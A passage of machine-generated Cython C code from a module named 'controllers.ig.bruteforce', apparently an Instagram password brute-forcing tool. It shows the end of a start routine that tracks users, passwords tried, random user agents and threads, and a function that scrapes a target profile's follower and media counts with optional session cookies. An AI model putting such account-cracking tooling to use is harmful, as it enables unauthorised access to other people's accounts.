  __pyx_t_6 = (__pyx_t_5) ? __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_5) : __Pyx_PyObject_CallNoArg(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
  if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 125, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

   

   
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_XDECREF(__pyx_t_9);
  __Pyx_XDECREF(__pyx_t_11);
  __Pyx_AddTraceback("controllers.ig.bruteforce.__init__.Base.start", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_rich);
  __Pyx_XDECREF(__pyx_v_i);
  __Pyx_XDECREF(__pyx_v_users);
  __Pyx_XDECREF(__pyx_v_kwargs);
  __Pyx_XDECREF(__pyx_v_password_used);
  __Pyx_XDECREF(__pyx_v_random_user_agent);
  __Pyx_XDECREF(__pyx_v_saved);
  __Pyx_XDECREF(__pyx_v_tips);
  __Pyx_XDECREF(__pyx_v_progress);
  __Pyx_XDECREF(__pyx_v_chunk);
  __Pyx_XDECREF(__pyx_v_target);
  __Pyx_XDECREF(__pyx_v_account);
  __Pyx_XDECREF(__pyx_v_data);
  __Pyx_XDECREF(__pyx_v_loading);
  __Pyx_XDECREF(__pyx_v_normal);
  __Pyx_XDECREF(__pyx_v_randoms);
  __Pyx_XDECREF(__pyx_v_start_time);
  __Pyx_XDECREF(__pyx_v_status);
  __Pyx_XDECREF(__pyx_v_task);
  __Pyx_XDECREF(__pyx_v_thread);
  __Pyx_XDECREF(__pyx_v_end_time);
  __Pyx_XDECREF(__pyx_v_minutes);
  __Pyx_DECREF(((PyObject *)__pyx_cur_scope));
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

 

 
static PyObject *__pyx_pw_11controllers_2ig_10bruteforce_8__init___4Base_5profile_channel(PyObject *__pyx_self, PyObject *__pyx_args, PyObject *__pyx_kwds);  
static PyMethodDef __pyx_mdef_11controllers_2ig_10bruteforce_8__init___4Base_5profile_channel = {"profile_channel", (PyCFunction)(void*)(PyCFunctionWithKeywords)__pyx_pw_11controllers_2ig_10bruteforce_8__init___4Base_5profile_channel, METH_VARARGS|METH_KEYWORDS, 0};
static PyObject *__pyx_pw_11controllers_2ig_10bruteforce_8__init___4Base_5profile_channel(PyObject *__pyx_self, PyObject *__pyx_args, PyObject *__pyx_kwds) {
  PyObject *__pyx_v_self = 0;
  PyObject *__pyx_v_username = 0;
  PyObject *__pyx_v_cookie = 0;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("profile_channel (wrapper)", 0);
  {
    static PyObject **__pyx_pyargnames[] = {&__pyx_n_s_self,&__pyx_n_s_username,&__pyx_n_s_cookie,0};
    PyObject* values[3] = {0,0,0};
    values[2] = ((PyObject *)((PyObject *)Py_None));
    if (unlikely(__pyx_kwds)) {
      Py_ssize_t kw_args;
      const Py_ssize_t pos_args = PyTuple_GET_SIZE(__pyx_args);
      switch (pos_args) {
        case  3: values[2] = PyTuple_GET_ITEM(__pyx_args, 2);
        CYTHON_FALLTHROUGH;
        case  2: values[1] = PyTuple_GET_ITEM(__pyx_args, 1);
        CYTHON_FALLTHROUGH;
        case  1: values[0] = PyTuple_GET_ITEM(__pyx_args, 0);
        CYTHON_FALLTHROUGH;
        case  0: break;
        default: goto __pyx_L5_argtuple_error;
      }
      kw_args = PyDict_Size(__pyx_kwds);
      switch (pos_args) {
        case  0:
        if (likely((values[0] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_self)) != 0)) kw_args--;
        else goto __pyx_L5_argtuple_error;
        CYTHON_FALLTHROUGH;
        case  1:
        if (likely((values[1] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_username)) != 0)) kw_args--;
        else {
          __Pyx_RaiseArgtupleInvalid("profile_channel", 0, 2, 3, 1); __PYX_ERR(0, 127, __pyx_L3_error)
        }
        CYTHON_FALLTHROUGH;
        case  2:
        if (kw_args > 0) {
          PyObject* value = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_cookie);
          if (value) { values[2] = value; kw_args--; }
        }
      }
      if (unlikely(kw_args > 0)) {
        if (unlikely(__Pyx_ParseOptionalKeywords(__pyx_kwds, __pyx_pyargnames, 0, values, pos_args, "profile_channel") < 0)) __PYX_ERR(0, 127, __pyx_L3_error)
      }
    } else {
      switch (PyTuple_GET_SIZE(__pyx_args)) {
        case  3: values[2] = PyTuple_GET_ITEM(__pyx_args, 2);
        CYTHON_FALLTHROUGH;
        case  2: values[1] = PyTuple_GET_ITEM(__pyx_args, 1);
        values[0] = PyTuple_GET_ITEM(__pyx_args, 0);
        break;
        default: goto __pyx_L5_argtuple_error;
      }
    }
    __pyx_v_self = values[0];
    __pyx_v_username = values[1];
    __pyx_v_cookie = values[2];
  }
  goto __pyx_L4_argument_unpacking_done;
  __pyx_L5_argtuple_error:;
  __Pyx_RaiseArgtupleInvalid("profile_channel", 0, 2, 3, PyTuple_GET_SIZE(__pyx_args)); __PYX_ERR(0, 127, __pyx_L3_error)
  __pyx_L3_error:;
  __Pyx_AddTraceback("controllers.ig.bruteforce.__init__.Base.profile_channel", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __Pyx_RefNannyFinishContext();
  return NULL;
  __pyx_L4_argument_unpacking_done:;
  __pyx_r = __pyx_pf_11controllers_2ig_10bruteforce_8__init___4Base_4profile_channel(__pyx_self, __pyx_v_self, __pyx_v_username, __pyx_v_cookie);

   
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_11controllers_2ig_10bruteforce_8__init___4Base_4profile_channel(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self, PyObject *__pyx_v_username, PyObject *__pyx_v_cookie) {
  PyObject *__pyx_v_results = NULL;
  PyObject *__pyx_v_http = NULL;
  PyObject *__pyx_v_num_retries = NULL;
  PyObject *__pyx_v_response = NULL;
  PyObject *__pyx_v_user = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  int __pyx_t_2;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  PyObject *__pyx_t_7 = NULL;
  PyObject *__pyx_t_8 = NULL;
  PyObject *__pyx_t_9 = NULL;
  PyObject *__pyx_t_10 = NULL;
  int __pyx_t_11;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("profile_channel", 0);

   
  __pyx_t_1 = __Pyx_PyDict_NewPresized(4); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 128, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_t_1, __pyx_n_s_name, Py_None) < 0) __PYX_ERR(0, 128, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_1, __pyx_n_s_followers, __pyx_int_0) < 0) __PYX_ERR(0, 128, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_1, __pyx_n_s_following, __pyx_int_0) < 0) __PYX_ERR(0, 128, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_1, __pyx_n_s_media, __pyx_int_0) < 0) __PYX_ERR(0, 128, __pyx_L1_error)
  __pyx_v_results = ((PyObject*)__pyx_t_1);
  __pyx_t_1 = 0;

   
  __pyx_t_2 = __Pyx_PyObject_IsTrue(__pyx_v_cookie); if (unlikely(__pyx_t_2 < 0)) __PYX_ERR(0, 129, __pyx_L1_error)
  if (__pyx_t_2) {

     
    __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_Http); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 130, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_3 = __Pyx_PyDict_NewPresized(2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 130, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_app); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 130, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_IG_REQUEST_HEADERS); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 130, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_headers, __pyx_t_5) < 0) __PYX_ERR(0, 130, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_cookies, __pyx_v_cookie) < 0) __PYX_ERR(0, 130, __pyx_L1_error)
    __pyx_t_5 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_empty_tuple, __pyx_t_3); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 130, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __pyx_v_http = __pyx_t_5;
    __pyx_t_5 = 0;

     
    goto __pyx_L3;
  }

   
    {
    __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_http); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 132, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __pyx_v_http = __pyx_t_5;
    __pyx_t_5 = 0;
  }
  __pyx_L3:;

   
  __Pyx_INCREF(__pyx_int_1);
  __pyx_v_num_retries = __pyx_int_1;

   
  while (1) {

     
    {
      __Pyx_PyThreadState_declare
      __Pyx_PyThreadState_assign
      __Pyx_ExceptionSave(&__pyx_t_6, &__pyx_t_7, &__pyx_t_8);
      __Pyx_XGOTREF(__pyx_t_6);
      __Pyx_XGOTREF(__pyx_t_7);
      __Pyx_XGOTREF(__pyx_t_8);
        {

         
        __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_v_http, __pyx_n_s_get); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 137, __pyx_L6_error)
        __Pyx_GOTREF(__pyx_t_1);
        __pyx_t_4 = PyNumber_Add(__pyx_kp_u_https_www_instagram_com, __pyx_v_username); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 137, __pyx_L6_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_9 = PyNumber_Add(__pyx_t_4, __pyx_kp_u_channel___a_1); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 137, __pyx_L6_error)
        __Pyx_GOTREF(__pyx_t_9);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = NULL;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_1))) {
          __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_1);
          if (likely(__pyx_t_4)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
            __Pyx_INCREF(__pyx_t_4);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_1, function);
          }
        }
        __pyx_t_3 = (__pyx_t_4) ? __Pyx_PyObject_Call2Args(__pyx_t_1, __pyx_t_4, __pyx_t_9) : __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_t_9);
        __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
        if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 137, __pyx_L6_error)
        __Pyx_GOTREF(__pyx_t_3);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_json); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 137, __pyx_L6_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        __pyx_t_3 = NULL;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_1))) {
          __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_1);
          if (likely(__pyx_t_3)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
            __Pyx_INCREF(__pyx_t_3);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_1, function);
          }
        }
        __pyx_t_5 = (__pyx_t_3) ? __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_t_3) : __Pyx_PyObject_CallNoArg(__pyx_t_1);
        __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
        if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 137, __pyx_L6_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __Pyx_XDECREF_SET(__pyx_v_response, __pyx_t_5);
        __pyx_t_5 = 0;

         
        goto __pyx_L11_try_break;

         
      }
      __pyx_L6_error:;
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;

       
      __Pyx_ErrFetch(&__pyx_t_5, &__pyx_t_1, &__pyx_t_3);
      __Pyx_GetModuleGlobalName(__pyx_t_9, __pyx_n_s_ConnectionError); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 139, __pyx_L8_except_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_Timeout); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 139, __pyx_L8_except_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_n_s_ChunkedEncodingError); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 139, __pyx_L8_except_error)
      __Pyx_GOTREF(__pyx_t_10);
      __pyx_t_11 = __Pyx_PyErr_GivenExceptionMatches(__pyx_t_5, __pyx_t_9) || __Pyx_PyErr_GivenExceptionMatches(__pyx_t_5, __pyx_t_4) || __Pyx_PyErr_GivenExceptionMatches(__pyx_t_5, __pyx_t_10);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __Pyx_ErrRestore(__pyx_t_5, __pyx_t_1, __pyx_t_3);
      __pyx_t_5 = 0; __pyx_t_1 = 0; __pyx_t_3 = 0;
      if (__pyx_t_11) {
        __Pyx_AddTraceback("controllers.ig.bruteforce.__init__.Base.profile_channel", __pyx_clineno, __pyx_lineno, __pyx_filename);
        if (__Pyx_GetException(&__pyx_t_3, &__pyx_t_1, &__pyx_t_5) < 0) __PYX_ERR(0, 139, __pyx_L8_except_error)
        __Pyx_GOTREF(__pyx_t_3);
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_GOTREF(__pyx_t_5);

         
        goto __pyx_L15_except_continue;
        __pyx_L15_except_continue:;
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        goto __pyx_L12_try_continue;
      }

       
        {
        __Pyx_AddTraceback("controllers.ig.bruteforce.__init__.Base.profile_channel", __pyx_clineno, __pyx_lineno, __pyx_filename);
        if (__Pyx_GetException(&__pyx_t_5, &__pyx_t_1, &__pyx_t_3) < 0) __PYX_ERR(0, 141, __pyx_L8_except_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_GOTREF(__pyx_t_3);

         
        __pyx_t_10 = PyObject_RichCompare(__pyx_v_num_retries, __pyx_int_5, Py_GE); __Pyx_XGOTREF(__pyx_t_10); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 142, __pyx_L8_except_error)
        __pyx_t_2 = __Pyx_PyObject_IsTrue(__pyx_t_10); if (unlikely(__pyx_t_2 < 0)) __PYX_ERR(0, 142, __pyx_L8_except_error)
        __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
        if (__pyx_t_2) {

           
          goto __pyx_L16_except_break;

           
        }

         
          {
          __pyx_t_10 = __Pyx_PyInt_AddObjC(__pyx_v_num_retries, __pyx_int_1, 1, 1, 0); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 145, __pyx_L8_except_error)
          __Pyx_GOTREF(__pyx_t_10);
          __Pyx_DECREF_SET(__pyx_v_num_retries, __pyx_t_10);
          __pyx_t_10 = 0;

           
          goto __pyx_L17_except_continue;
        }
        __pyx_L16_except_break:;
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        goto __pyx_L11_try_break;
        __pyx_L17_except_continue:;
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        goto __pyx_L12_try_continue;
      }
      __pyx_L8_except_error:;

       
      __Pyx_XGIVEREF(__pyx_t_6);
      __Pyx_XGIVEREF(__pyx_t_7);
      __Pyx_XGIVEREF(__pyx_t_8);
      __Pyx_ExceptionReset(__pyx_t_6, __pyx_t_7, __pyx_t_8);
      goto __pyx_L1_error;
      __pyx_L11_try_break:;
      __Pyx_XGIVEREF(__pyx_t_6);
      __Pyx_XGIVEREF(__pyx_t_7);
      __Pyx_XGIVEREF(__pyx_t_8);
      __Pyx_ExceptionReset(__pyx_t_6, __pyx_t_7, __pyx_t_8);
      goto __pyx_L5_break;
      __pyx_L12_try_continue:;
      __Pyx_XGIVEREF(__pyx_t_6);
      __Pyx_XGIVEREF(__pyx_t_7);
      __Pyx_XGIVEREF(__pyx_t_8);
      __Pyx_ExceptionReset(__pyx_t_6, __pyx_t_7, __pyx_t_8);
      goto __pyx_L4_continue;
    }
    __pyx_L4_continue:;
  }
  __pyx_L5_break:;

   
    {
    {
      __Pyx_PyThreadState_declare
      __Pyx_PyThreadState_assign
      __Pyx_ExceptionSave(&__pyx_t_8, &__pyx_t_7, &__pyx_t_6);
      __Pyx_XGOTREF(__pyx_t_8);
      __Pyx_XGOTREF(__pyx_t_7);
      __Pyx_XGOTREF(__pyx_t_6);
        {

         
        if (unlikely(!__pyx_v_response)) { __Pyx_RaiseUnboundLocalError("response"); __PYX_ERR(0, 149, __pyx_L22_error) }
        __pyx_t_3 = __Pyx_PyObject_Dict_GetItem(__pyx_v_response, __pyx_n_u_graphql); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 149, __pyx_L22_error)
        __Pyx_GOTREF(__pyx_t_3);
        __pyx_t_1 = __Pyx_PyObject_Dict_GetItem(__pyx_t_3, __pyx_n_u_user); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 149, __pyx_L22_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        __pyx_v_user = __pyx_t_1;
        __pyx_t_1 = 0;

         
        __pyx_t_1 = __Pyx_PyObject_Dict_GetItem(__pyx_v_user, __pyx_n_u_full_name); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 150, __pyx_L22_error)
        __Pyx_GOTREF(__pyx_t_1);
        if (unlikely(PyDict_SetItem(__pyx_v_results, __pyx_n_u_name, __pyx_t_1) < 0)) __PYX_ERR(0, 150, __pyx_L22_error)
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

         
        __pyx_t_1 = __Pyx_PyObject_Dict_GetItem(__pyx_v_user, __pyx_n_u_edge_followed_by); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 151, __pyx_L22_error)
        __Pyx_GOTREF(__pyx_t_1);
        __pyx_t_3 = __Pyx_PyObject_Dict_GetItem(__pyx_t_1, __pyx_n_u_count); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 151, __pyx_L22_error)
        __Pyx_GOTREF(__pyx_t_3);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        if (unlikely(PyDict_SetItem(__pyx_v_results, __pyx_n_u_followers, __pyx_t_3) < 0)) __PYX_ERR(0, 151, __pyx_L22_error)
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

         
        __pyx_t_3 = __Pyx_PyObject_Dict_GetItem(__pyx_v_user, __pyx_n_u_edge_follow); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 152, __pyx_L22_error)
        __Pyx_GOTREF(__pyx_t_3);
        __pyx_t_1 = __Pyx_PyObject_Dict_GetItem(__pyx_t_3, __pyx_n_u_count); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 152, __pyx_L22_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        if (unlikely(PyDict_SetItem(__pyx_v_results, __pyx_n_u_following, __pyx_t_1) < 0)) __PYX_ERR(0, 152, __pyx_L22_error)
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

         
        __pyx_t_1 = __Pyx_PyObject_Dict_GetItem(__pyx_v_user, __pyx_n_u_edge_owner_to_timeline_media); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 153, __pyx_L22_error)
        __Pyx_GOTREF(__pyx_t_1);
        __pyx_t_3 = __Pyx_PyObject_Dict_GetItem(__pyx_t_1, __pyx_n_u_count); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 153, __pyx_L22_error)
        __Pyx_GOTREF(__pyx_t_3);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        if (unlikely(PyDict_SetItem(__pyx_v_results, __pyx_n_u_media, __pyx_t_3) < 0)) __PYX_ERR(0, 153, __pyx_L22_error)
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

         
      }
      __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
      __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
      goto __pyx_L27_try_end;
      __pyx_L22_error:;
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;

       
        {
        __Pyx_ErrRestore(0,0,0);
        goto __pyx_L23_exception_handled;
      }
      __pyx_L23_exception_handled:;
      __Pyx_XGIVEREF(__pyx_t_8);
      __Pyx_XGIVEREF(__pyx_t_7);
      __Pyx_XGIVEREF(__pyx_t_6);
      __Pyx_ExceptionReset(__pyx_t_8, __pyx_t_7, __pyx_t_6);
      __pyx_L27_try_end:;
    }
  }

   
    {
     {
      __Pyx_XDECREF(__pyx_r);
      __Pyx_INCREF(__pyx_v_results);
      __pyx_r = __pyx_v_results;
      goto __pyx_L0;
    }
  }

   

   
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_9);
  __Pyx_XDECREF(__pyx_t_10);
  __Pyx_AddTraceback("controllers.ig.bruteforce.__init__.Base.profile_channel", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_results);
  __Pyx_XDECREF(__pyx_v_http);
  __Pyx_XDECREF(__pyx_v_num_retries);
  __Pyx_XDECREF(__pyx_v_response);
  __Pyx_XDECREF(__pyx_v_user);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

 

 
static PyObject *__pyx_pw_11controllers_2ig_10bruteforce_8__init___4Base_7my_profile(PyObject *__pyx_self, PyObject *__pyx_args, PyObject *__pyx_kwds);  
static PyMethodDef __pyx_mdef_11controllers_2ig_10bruteforce_8__init___4Base_7my_profile = {"my_profile", (PyCFunction)(void*)(PyCFunctionWithKeywords)__pyx_pw_11controllers_2ig_10bruteforce_8__init___4Base_7my_profile, METH_VARARGS|METH_KEYWORDS, 0};
static PyObject *__pyx_pw_11controllers_2ig_10bruteforce_8__init___4Base_7my_profile(PyObject *__pyx_self, PyObject *__pyx_args, PyObject *__pyx_kwds) {
  PyObject *__pyx_v_self = 0;
  PyObject *__pyx_v_username = 0;
  PyObject *__pyx_v_cookie = 0;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("my_profile (wrapper)", 0);
  {
    static PyObject **__pyx_pyargnames[] = {&__pyx_n_s_self,&__pyx_n_s_username,&__pyx_n_s_cookie,0};
    PyObject* values[3] = {0,0,0};
    if (unlikely(__pyx_kwds)) {
      Py_ssize_t kw_args;
      const Py_ssize_t pos_args = PyTuple_GET_SIZE(__pyx_args);
      switch (pos_args) {
        case  3: values[2] = PyTuple_GET_ITEM(__pyx_args, 2);
        CYTHON_FALLTHROUGH;
        case  2: values[1] = PyTuple_GET_ITEM(__pyx_args, 1);
        CYTHON_FALLTHROUGH;
        case  1: values[0] = PyTuple_GET_ITEM(__pyx_args, 0);
        CYTHON_FALLTHROUGH;
        case  0: break;
        default: goto __pyx_L5_argtuple_error;
      }
      kw_args = PyDict_Size(__pyx_kwds);
      switch (pos_args) {
        case  0:
        if (likely((values[0] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_self)) != 0)) kw_args--;
        else goto __pyx_L5_argtuple_error;
        CYTHON_FALLTHROUGH;
        case  1:
        if (likely((values[1] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_username)) != 0)) kw_args--;
        else {
          __Pyx_RaiseArgtupleInvalid("my_profile", 1, 3, 3, 1); __PYX_ERR(0, 159, __pyx_L3_error)
        }
        CYTHON_FALLTHROUGH;
        case  2:
        if (likely((values[2] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_cookie)) != 0)) kw_args--;
        else {
          __Pyx_RaiseArgtupleInvalid("my_profile", 1, 3, 3, 2); __PYX_ERR(0, 159, __pyx_L3_error)
        }
      }
      if (unlikely(kw_args > 0)) {
        if (unlikely(__Pyx_ParseOptionalKeywords(__pyx_kwds, __pyx_pyargnames, 0, values, pos_args, "my_profile") < 0)) __PYX_ERR(0, 159, __pyx_L3_error)
      }
    } else if (PyTuple_GET_SIZE(__pyx_args) != 3) {
      goto __pyx_L5_argtuple_error;
    } else {
      values[0] = PyTuple_GET_ITEM(__pyx_args, 0);
      values[1] = PyTuple_GET_ITEM(__pyx_args, 1);
      values[2] = PyTuple_GET_ITEM(__pyx_args, 2);
    }
    __pyx_v_self = values[0];
    __pyx_v_username = values[1];
    __pyx_v_cookie = values[2];
  }
  goto __pyx_L4_argument_unpacking_done;
  __pyx_L5_argtuple_error:;
  __Pyx_RaiseArgtupleInvalid("my_profile", 1, 3, 3, PyTuple_GET_SIZE(__pyx_args)); __PYX_ERR(0, 159, __pyx_L3_error)
  __pyx_L3_error:;
  __Pyx_AddTraceback("controllers.ig.bruteforce.__init__.Base.my_profile", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __Pyx_RefNannyFinishContext();
  return NULL;
  __pyx_L4_argument_unpacking_done:;
  __pyx_r = __pyx_pf_11controllers_2ig_10bruteforce_8__init___4Base_6my_profile(__pyx_self, __pyx_v_self, __pyx_v_username, __pyx_v_cookie);

   
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_11controllers_2ig_10bruteforce_8__init___4Base_6my_profile(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self, PyObject *__pyx_v_username, PyObject *__pyx_v_cookie) {
  PyObject *__pyx_v_results = NULL;
  PyObject *__pyx_v_http = NULL;
  PyObject *__pyx_v_num_retries = NULL;
  PyObject *__pyx_v_response = NULL;
  PyObject *__pyx_v_shared_data = NULL;
